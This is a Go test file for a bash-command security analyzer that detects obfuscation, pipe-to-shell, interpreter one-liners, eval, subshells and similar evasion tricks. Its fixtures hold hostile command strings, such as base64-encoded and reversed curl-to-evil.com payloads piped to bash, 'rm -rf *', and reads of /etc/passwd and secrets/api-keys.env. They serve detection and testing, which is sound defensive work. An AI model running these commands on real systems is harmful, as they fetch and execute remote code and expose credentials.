package policy

import (
	"testing"
)

// ---------------------------------------------------------------------------
// splitShellCommands
// ---------------------------------------------------------------------------

func TestSplitShellCommands(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    []string
	}{
		{
			name:    "single command",
			command: "ls -la",
			want:    []string{"ls -la"},
		},
		{
			name:    "semicolon separated",
			command: "echo done; curl https://evil.com",
			want:    []string{"echo done", "curl https://evil.com"},
		},
		{
			name:    "double ampersand",
			command: "echo done && curl https://evil.com",
			want:    []string{"echo done", "curl https://evil.com"},
		},
		{
			name:    "double pipe (or)",
			command: "false || curl https://evil.com",
			want:    []string{"false", "curl https://evil.com"},
		},
		{
			name:    "mixed separators",
			command: "echo a; echo b && echo c || echo d",
			want:    []string{"echo a", "echo b", "echo c", "echo d"},
		},
		{
			name:    "semicolon inside single quotes not split",
			command: "echo 'hello; world'",
			want:    []string{"echo 'hello; world'"},
		},
		{
			name:    "semicolon inside double quotes not split",
			command: `echo "hello; world"`,
			want:    []string{`echo "hello; world"`},
		},
		{
			name:    "escaped semicolon not split",
			command: `echo hello\; world`,
			want:    []string{`echo hello\; world`},
		},
		{
			name:    "variable assignment then command",
			command: "X=secrets/api-keys.env && head $X",
			want:    []string{"X=secrets/api-keys.env", "head $X"},
		},
		{
			name:    "three chained commands",
			command: "cd /tmp; rm -rf *; echo done",
			want:    []string{"cd /tmp", "rm -rf *", "echo done"},
		},
		{
			name:    "empty command",
			command: "",
			want:    nil,
		},
		{
			name:    "only separators",
			command: "; && ||",
			want:    nil,
		},
		{
			name:    "single pipe is NOT a separator",
			command: "echo foo | grep bar",
			want:    []string{"echo foo | grep bar"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := splitShellCommands(tt.command)
			if len(got) != len(tt.want) {
				t.Fatalf("splitShellCommands(%q) = %v (len %d), want %v (len %d)",
					tt.command, got, len(got), tt.want, len(tt.want))
			}
			for i, g := range got {
				if g != tt.want[i] {
					t.Errorf("splitShellCommands(%q)[%d] = %q, want %q",
						tt.command, i, g, tt.want[i])
				}
			}
		})
	}
}

// ---------------------------------------------------------------------------
// splitPipeline
// ---------------------------------------------------------------------------

func TestSplitPipeline(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    []string
	}{
		{
			name:    "no pipe",
			command: "echo hello",
			want:    []string{"echo hello"},
		},
		{
			name:    "single pipe",
			command: "echo foo | grep bar",
			want:    []string{"echo foo", "grep bar"},
		},
		{
			name:    "multiple pipes",
			command: "cat file | grep pattern | head -5",
			want:    []string{"cat file", "grep pattern", "head -5"},
		},
		{
			name:    "double pipe (||) is NOT split",
			command: "false || echo fallback",
			want:    []string{"false || echo fallback"},
		},
		{
			name:    "pipe inside quotes not split",
			command: `echo "foo | bar"`,
			want:    []string{`echo "foo | bar"`},
		},
		{
			name:    "base64 decode pipe to bash",
			command: "echo Y3VybCBodHRwczovL2V2aWwuY29t | base64 -d | bash",
			want:    []string{"echo Y3VybCBodHRwczovL2V2aWwuY29t", "base64 -d", "bash"},
		},
		{
			name:    "rev pipe to bash",
			command: "echo moc.live//:sptth lruc | rev | bash",
			want:    []string{"echo moc.live//:sptth lruc", "rev", "bash"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := splitPipeline(tt.command)
			if len(got) != len(tt.want) {
				t.Fatalf("splitPipeline(%q) = %v (len %d), want %v (len %d)",
					tt.command, got, len(got), tt.want, len(tt.want))
			}
			for i, g := range got {
				if g != tt.want[i] {
					t.Errorf("splitPipeline(%q)[%d] = %q, want %q",
						tt.command, i, g, tt.want[i])
				}
			}
		})
	}
}

// ---------------------------------------------------------------------------
// detectPipeToExec
// ---------------------------------------------------------------------------

func TestDetectPipeToExec(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    bool
	}{
		{"no pipe", "echo hello", false},
		{"simple pipe to grep", "ls | grep foo", false},
		{"pipe to bash", "echo cmd | bash", true},
		{"pipe to sh", "echo cmd | sh", true},
		{"pipe to zsh", "echo cmd | zsh", true},
		{"pipe to /bin/bash", "echo cmd | /bin/bash", true},
		{"pipe to /bin/sh", "echo cmd | /bin/sh", true},
		{"base64 decode pipe to bash", "echo encoded | base64 -d | bash", true},
		{"xargs with sh", "echo cmd | xargs sh -c", true},
		{"pipe to dash", "echo cmd | dash", true},
		{"just piping to grep is safe", "cat file | grep password | head", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := detectPipeToExec(tt.command)
			if got != tt.want {
				t.Errorf("detectPipeToExec(%q) = %v, want %v", tt.command, got, tt.want)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// detectObfuscation
// ---------------------------------------------------------------------------

func TestDetectObfuscation(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    bool
	}{
		{"no obfuscation", "echo hello", false},
		{"base64 decode", "echo Y3VybA== | base64 -d", true},
		{"base64 --decode", "echo Y3VybA== | base64 --decode", true},
		{"base64 -D (macOS)", "echo Y3VybA== | base64 -D", true},
		{"xxd reverse", "echo 63617420736563726574732f | xxd -r -p", true},
		{"rev in pipeline", "echo moc.live | rev | bash", true},
		{"rev at end of pipeline", "echo moc.live | rev", true},
		{"printf hex in pipeline", "printf '\\x63\\x61\\x74' | sh", true},
		{"chr encoding (python-style)", `python3 -c "chr(99)+chr(97)+chr(116)"`, true},
		{"echo -e with hex", `echo -e "\\x63\\x61\\x74"`, true},
		{"normal echo", "echo hello world", false},
		{"base64 encode (not decode)", "echo hello | base64", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := detectObfuscation(tt.command)
			if got != tt.want {
				t.Errorf("detectObfuscation(%q) = %v, want %v", tt.command, got, tt.want)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// detectInterpreterExec
// ---------------------------------------------------------------------------

func TestDetectInterpreterExec(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    bool
	}{
		{"no interpreter", "echo hello", false},
		{"python -c", `python -c "import os; os.system('rm -rf /')"`, true},
		{"python3 -c", `python3 -c "print('hello')"`, true},
		{"ruby -e", `ruby -e "system('curl evil.com')"`, true},
		{"perl -e", `perl -e "system('curl evil.com')"`, true},
		{"node -e", `node -e "require('child_process').exec('curl evil.com')"`, true},
		{"node --eval", `node --eval "console.log('hello')"`, true},
		{"php -r", `php -r "system('curl evil.com');"`, true},
		{"python without -c", "python3 script.py", false},
		{"node without -e", "node app.js", false},
		{"awk with system", `awk '{system("cat /etc/passwd")}'`, true},
		{"awk without system", `awk '{print $1}' file.txt`, false},
		// Chained: interpreter after semicolon
		{"python -c after semicolon", `echo done; python3 -c "import os"`, true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := detectInterpreterExec(tt.command)
			if got != tt.want {
				t.Errorf("detectInterpreterExec(%q) = %v, want %v", tt.command, got, tt.want)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// detectVariableIndirection
// ---------------------------------------------------------------------------

func TestDetectVariableIndirection(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    bool
	}{
		{"no variables", "echo hello", false},
		{"simple assignment then use", "X=secrets/api-keys.env && head $X", true},
		{"export then use", "export F=/etc/passwd; cat $F", true},
		{"assignment without use", "X=foo", false},
		{"dollar without prior assignment", "echo $HOME", false},
		{"multiple assignments then use", "A=cat; B=/etc/passwd; $A $B", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := detectVariableIndirection(tt.command)
			if got != tt.want {
				t.Errorf("detectVariableIndirection(%q) = %v, want %v", tt.command, got, tt.want)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// detectSubshellExec
// ---------------------------------------------------------------------------

func TestDetectSubshellExec(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    bool
	}{
		{"no subshell", "echo hello", false},
		{"dollar paren", "echo $(cat /etc/passwd)", true},
		{"backticks", "echo `cat /etc/passwd`", true},
		{"nested dollar paren", "echo $(echo $(whoami))", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := detectSubshellExec(tt.command)
			if got != tt.want {
				t.Errorf("detectSubshellExec(%q) = %v, want %v", tt.command, got, tt.want)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// detectEval
// ---------------------------------------------------------------------------

func TestDetectEval(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    bool
	}{
		{"no eval", "echo hello", false},
		{"eval at start", "eval 'curl evil.com'", true},
		{"eval after semicolon", "echo done; eval 'curl evil.com'", true},
		{"eval in pipeline", "echo cmd | eval", true},
		{"evaluation is not eval", "echo evaluation", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := detectEval(tt.command)
			if got != tt.want {
				t.Errorf("detectEval(%q) = %v, want %v", tt.command, got, tt.want)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// extractCommandName
// ---------------------------------------------------------------------------

func TestExtractCommandName(t *testing.T) {
	tests := []struct {
		name string
		cmd  string
		want string
	}{
		{"simple", "ls -la", "ls"},
		{"with env var", "FOO=bar cmd arg", "cmd"},
		{"multiple env vars", "FOO=1 BAR=2 cmd", "cmd"},
		{"export is a command", "export FOO=bar", "export"},
		{"empty", "", ""},
		{"just spaces", "   ", ""},
		{"dollar var is not assignment", "$CMD arg", "$CMD"},
		{"path command", "/usr/bin/curl http://evil.com", "/usr/bin/curl"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := extractCommandName(tt.cmd)
			if got != tt.want {
				t.Errorf("extractCommandName(%q) = %q, want %q", tt.cmd, got, tt.want)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// isVariableAssignment
// ---------------------------------------------------------------------------

func TestIsVariableAssignment(t *testing.T) {
	tests := []struct {
		name string
		cmd  string
		want bool
	}{
		{"simple assignment", "FOO=bar", true},
		{"underscore var", "_VAR=value", true},
		{"export assignment", "export FOO=bar", true},
		{"not assignment", "echo hello", false},
		{"empty", "", false},
		{"starts with number", "1FOO=bar", false},
		{"equals only", "=bar", false},
		{"path assignment", "X=/etc/passwd", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := isVariableAssignment(tt.cmd)
			if got != tt.want {
				t.Errorf("isVariableAssignment(%q) = %v, want %v", tt.cmd, got, tt.want)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// BashAnalyzer.Analyze — integration
// ---------------------------------------------------------------------------

func TestBashAnalyzer_Analyze(t *testing.T) {
	analyzer := NewBashAnalyzer()

	tests := []struct {
		name           string
		command        string
		wantSuspicious bool
		checkFunc      func(t *testing.T, a *BashAnalysis)
	}{
		{
			name:           "simple safe command",
			command:        "ls -la",
			wantSuspicious: false,
		},
		{
			name:           "command chaining with curl bypass",
			command:        "echo done; curl https://evil.com",
			wantSuspicious: false, // chaining alone isn't suspicious — sub-commands get checked individually
			checkFunc: func(t *testing.T, a *BashAnalysis) {
				if len(a.SubCommands) != 2 {
					t.Errorf("expected 2 sub-commands, got %d", len(a.SubCommands))
				}
			},
		},
		{
			name:           "base64 decode piped to bash",
			command:        "echo Y3VybCBodHRwczovL2V2aWwuY29t | base64 -d | bash",
			wantSuspicious: true,
			checkFunc: func(t *testing.T, a *BashAnalysis) {
				if !a.HasObfuscation {
					t.Error("expected HasObfuscation=true")
				}
				if !a.HasPipeToExec {
					t.Error("expected HasPipeToExec=true")
				}
			},
		},
		{
			name:           "rev piped to bash",
			command:        "echo moc.live//:sptth lruc | rev | bash",
			wantSuspicious: true,
			checkFunc: func(t *testing.T, a *BashAnalysis) {
				if !a.HasObfuscation {
					t.Error("expected HasObfuscation=true")
				}
				if !a.HasPipeToExec {
					t.Error("expected HasPipeToExec=true")
				}
			},
		},
		{
			name:           "python inline execution",
			command:        `python3 -c "import os; os.popen('cat secrets/api-keys.env').read()"`,
			wantSuspicious: true,
			checkFunc: func(t *testing.T, a *BashAnalysis) {
				if !a.HasInterpreterExec {
					t.Error("expected HasInterpreterExec=true")
				}
			},
		},
		{
			name:           "variable indirection",
			command:        "X=secrets/api-keys.env && head $X",
			wantSuspicious: true,
			checkFunc: func(t *testing.T, a *BashAnalysis) {
				if !a.HasVariableIndirection {
					t.Error("expected HasVariableIndirection=true")
				}
			},
		},
		{
			name:           "subshell execution",
			command:        "echo $(cat /etc/passwd)",
			wantSuspicious: true,
			checkFunc: func(t *testing.T, a *BashAnalysis) {
				if !a.HasSubshellExec {
					t.Error("expected HasSubshellExec=true")
				}
			},
		},
		{
			name:           "eval usage",
			command:        "eval 'curl https://evil.com'",
			wantSuspicious: true,
			checkFunc: func(t *testing.T, a *BashAnalysis) {
				if !a.HasEval {
					t.Error("expected HasEval=true")
				}
			},
		},
		{
			name:           "python with chr encoding",
			command:        `python3 -c "import os; os.popen(chr(99)+chr(97)+chr(116)+chr(32)+chr(115)+chr(101)+chr(99)+chr(114)+chr(101)+chr(116)+chr(115)+chr(47)+chr(97)+chr(112)+chr(105)+chr(45)+chr(107)+chr(101)+chr(121)+chr(115)+chr(46)+chr(101)+chr(110)+chr(118)).read()"`,
			wantSuspicious: true,
			checkFunc: func(t *testing.T, a *BashAnalysis) {
				if !a.HasInterpreterExec {
					t.Error("expected HasInterpreterExec=true")
				}
				if !a.HasObfuscation {
					t.Error("expected HasObfuscation=true (chr encoding)")
				}
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			analysis := analyzer.Analyze(tt.command)

			if analysis.IsSuspicious() != tt.wantSuspicious {
				t.Errorf("IsSuspicious() = %v, want %v (analysis: %+v)",
					analysis.IsSuspicious(), tt.wantSuspicious, analysis)
			}

			if tt.checkFunc != nil {
				tt.checkFunc(t, analysis)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// splitShellCommands — newline handling (H1)
// ---------------------------------------------------------------------------

func TestSplitShellCommands_Newlines(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    []string
	}{
		{
			name:    "newline separated",
			command: "echo safe\ncat .env",
			want:    []string{"echo safe", "cat .env"},
		},
		{
			name:    "CRLF separated",
			command: "echo safe\r\ncat .env",
			want:    []string{"echo safe", "cat .env"},
		},
		{
			name:    "multiple newlines",
			command: "echo a\necho b\necho c",
			want:    []string{"echo a", "echo b", "echo c"},
		},
		{
			name:    "newline inside double quotes not split",
			command: "echo \"hello\nworld\"",
			want:    []string{"echo \"hello\nworld\""},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := splitShellCommands(tt.command)
			if len(got) != len(tt.want) {
				t.Fatalf("splitShellCommands(%q) = %v (len %d), want %v (len %d)",
					tt.command, got, len(got), tt.want, len(tt.want))
			}
			for i, g := range got {
				if g != tt.want[i] {
					t.Errorf("splitShellCommands(%q)[%d] = %q, want %q",
						tt.command, i, g, tt.want[i])
				}
			}
		})
	}
}

// ---------------------------------------------------------------------------
// detectSubshellExec — process substitution (H2)
// ---------------------------------------------------------------------------

func TestDetectSubshellExec_ProcessSubstitution(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    bool
	}{
		{"process substitution <()", "diff <(cat .env) /dev/null", true},
		{"process substitution >()", "cat file > >(tee log.txt)", true},
		{"regular less-than", "test 1 -lt 2", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := detectSubshellExec(tt.command)
			if got != tt.want {
				t.Errorf("detectSubshellExec(%q) = %v, want %v", tt.command, got, tt.want)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// detectHereDoc (H5)
// ---------------------------------------------------------------------------

func TestDetectHereDoc(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    bool
	}{
		{"no here-doc", "echo hello", false},
		{"here-document", "bash <<EOF\ncat .env\nEOF", true},
		{"here-string", "cat <<< 'secret'", true},
		{"heredoc with quotes", "bash << 'SCRIPT'\ncat .env\nSCRIPT", true},
		{"not heredoc - just less than", "test 1 -lt 2", false},
		{"heredoc marker inside single quotes", "echo '<<EOF'", false},
		{"heredoc marker inside double quotes", `echo "<<EOF"`, false},
		{"grep for heredoc pattern", `grep "<<" file.txt`, false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := detectHereDoc(tt.command)
			if got != tt.want {
				t.Errorf("detectHereDoc(%q) = %v, want %v", tt.command, got, tt.want)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// detectBraceExpansion (M2)
// ---------------------------------------------------------------------------

func TestDetectBraceExpansion(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    bool
	}{
		{"no braces", "echo hello", false},
		{"brace expansion", "{cat,.env}", true},
		{"brace with spaces", "echo {a,b,c}", true},
		{"single brace no comma", "echo {a}", false},
		{"json-like not flagged", `echo '{"key":"value"}'`, false},
		{"json with comma in single quotes", `echo '{"a","b"}'`, false},
		{"json with comma in double quotes", `echo "{\"a\",\"b\"}"`, false},
		{"python set literal in quotes", `python -c 'x={1,2,3}'`, false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := detectBraceExpansion(tt.command)
			if got != tt.want {
				t.Errorf("detectBraceExpansion(%q) = %v, want %v", tt.command, got, tt.want)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// detectAliasOrFunc (H6)
// ---------------------------------------------------------------------------

func TestDetectAliasOrFunc(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    bool
	}{
		{"no alias", "echo hello", false},
		{"alias definition", "alias c=curl; c evil.com", true},
		{"function keyword", "function f { curl evil.com; }; f", true},
		{"parenthesis function", "f() { curl evil.com; }; f", true},
		{"alias alone", "alias c=curl", true},
		{"subshell not func", "echo $(f something)", false},
		{"command substitution not func", "result=$(cat file)", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := detectAliasOrFunc(tt.command)
			if got != tt.want {
				t.Errorf("detectAliasOrFunc(%q) = %v, want %v", tt.command, got, tt.want)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// extractCommandName — env prefix (M4)
// ---------------------------------------------------------------------------

func TestExtractCommandName_EnvPrefix(t *testing.T) {
	tests := []struct {
		name string
		cmd  string
		want string
	}{
		{"env curl", "env curl https://evil.com", "curl"},
		{"env with flags", "env -i PATH=/usr/bin curl evil.com", "curl"},
		{"plain env", "env", "env"},
		{"env -u VAR curl", "env -u VAR curl evil.com", "curl"},
		{"env -i -u VAR curl", "env -i -u VAR curl evil.com", "curl"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := extractCommandName(tt.cmd)
			if got != tt.want {
				t.Errorf("extractCommandName(%q) = %q, want %q", tt.cmd, got, tt.want)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// detectVariableIndirection — single command (M1)
// ---------------------------------------------------------------------------

func TestDetectVariableIndirection_SingleCommand(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    bool
	}{
		{"cat with env var", "cat $HOME/.env", true},
		{"head with env var", "head $SECRET_FILE", true},
		{"echo with env var (not file cmd)", "echo $HOME", false},
		{"ls with env var (not file cmd)", "ls $HOME", false},
		{"single-quoted dollar not flagged", "cat '$HOME/.env'", false},
		{"double-quoted dollar still flagged", `cat "$HOME/.env"`, true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := detectVariableIndirection(tt.command)
			if got != tt.want {
				t.Errorf("detectVariableIndirection(%q) = %v, want %v", tt.command, got, tt.want)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// extractFileArgsFromSingleCmd — redirections (H3) and dd if= (M3)
// ---------------------------------------------------------------------------

func TestExtractFileArgs_Redirections(t *testing.T) {
	analyzer := NewBashAnalyzer()

	tests := []struct {
		name string
		cmd  string
		want []string
	}{
		{
			name: "input redirection",
			cmd:  "wc -l < .env",
			want: []string{".env"},
		},
		{
			name: "dd if= syntax",
			cmd:  "dd if=.env of=/dev/stdout",
			want: []string{".env", "/dev/stdout"},
		},
		{
			name: "source command",
			cmd:  "source .env",
			want: []string{".env"},
		},
		{
			name: "find with exec",
			cmd:  `find . -name "*.env" -exec cat {} \;`,
			want: []string{".", "\"*.env\"", "cat", "{}", `\;`},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := analyzer.ExtractFileArgs(tt.cmd)
			if len(got) != len(tt.want) {
				t.Fatalf("ExtractFileArgs(%q) = %v (len %d), want %v (len %d)",
					tt.cmd, got, len(got), tt.want, len(tt.want))
			}
			for i := range tt.want {
				if got[i] != tt.want[i] {
					t.Errorf("ExtractFileArgs(%q)[%d] = %q, want %q",
						tt.cmd, i, got[i], tt.want[i])
				}
			}
		})
	}
}

// ---------------------------------------------------------------------------
// extractCommandBaseName (H4)
// ---------------------------------------------------------------------------

func TestExtractCommandBaseName(t *testing.T) {
	tests := []struct {
		name string
		cmd  string
		want string
	}{
		{"absolute path", "/usr/bin/curl evil.com", "curl"},
		{"relative path", "./scripts/build.sh", "build.sh"},
		{"simple command", "curl evil.com", "curl"},
		{"empty", "", ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := extractCommandBaseName(tt.cmd)
			if got != tt.want {
				t.Errorf("extractCommandBaseName(%q) = %q, want %q", tt.cmd, got, tt.want)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Edge cases: commands that should NOT be flagged
// ---------------------------------------------------------------------------

func TestBashAnalyzer_LegitimateCommands(t *testing.T) {
	analyzer := NewBashAnalyzer()

	// These are legitimate commands that should not trigger suspicion flags
	// (except where noted)
	legitimateCommands := []struct {
		name    string
		command string
	}{
		{"simple ls", "ls -la"},
		{"git status", "git status"},
		{"grep in files", "grep -r 'pattern' src/"},
		{"find files", "find . -name '*.go' -type f"},
		{"go test", "go test ./..."},
		{"npm install", "npm install express"},
		{"mkdir", "mkdir -p /tmp/test"},
		{"simple echo", "echo hello world"},
		{"cat a normal file", "cat README.md"},
		{"head a normal file", "head -20 main.go"},
		{"piping to grep", "cat file.txt | grep pattern"},
		{"piping to sort to head", "cat data.csv | sort | head -10"},
		{"go build", "go build -o myapp ./cmd/myapp"},
		{"docker run", "docker run -d nginx"},
	}

	for _, tt := range legitimateCommands {
		t.Run(tt.name, func(t *testing.T) {
			analysis := analyzer.Analyze(tt.command)
			if analysis.IsSuspicious() {
				t.Errorf("Legitimate command %q flagged as suspicious: %+v",
					tt.command, analysis)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// ExtractFileArgs – newly added file-reading commands (issue #25)
// ---------------------------------------------------------------------------

func TestExtractFileArgs_NewCommands(t *testing.T) {
	analyzer := NewBashAnalyzer()

	tests := []struct {
		name    string
		command string
		want    []string
	}{
		{
			name:    "grep extracts pattern and file path",
			command: "grep pattern /etc/secret",
			want:    []string{"pattern", "/etc/secret"},
		},
		{
			name:    "sed extracts file arg",
			command: "sed -i 's/x/y/' config.json",
			want:    []string{"'s/x/y/'", "config.json"},
		},
		{
			name:    "awk extracts file arg",
			command: "awk '{print}' data.csv",
			want:    []string{"'{print}'", "data.csv"},
		},
		{
			name:    "cp extracts both source and destination",
			command: "cp secrets/key.pem /tmp/",
			want:    []string{"secrets/key.pem", "/tmp/"},
		},
		{
			name:    "diff extracts both file paths",
			command: "diff file1.txt file2.txt",
			want:    []string{"file1.txt", "file2.txt"},
		},
		{
			name:    "jq extracts filter and file path",
			command: "jq '.key' config.json",
			want:    []string{"'.key'", "config.json"},
		},
		// NOTE: dd uses if=/of= syntax (e.g. "dd if=/dev/zero of=output.bin").
		// The current extractFileArgsFromSingleCmd implementation extracts
		// non-flag arguments, so dd's if=/of= parameters are not correctly
		// parsed as file paths. This is a known limitation.
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := analyzer.ExtractFileArgs(tt.command)
			if len(got) != len(tt.want) {
				t.Fatalf("ExtractFileArgs(%q) = %v (len %d), want %v (len %d)",
					tt.command, got, len(got), tt.want, len(tt.want))
			}
			for i := range tt.want {
				if got[i] != tt.want[i] {
					t.Errorf("ExtractFileArgs(%q)[%d] = %q, want %q",
						tt.command, i, got[i], tt.want[i])
				}
			}
		})
	}
}
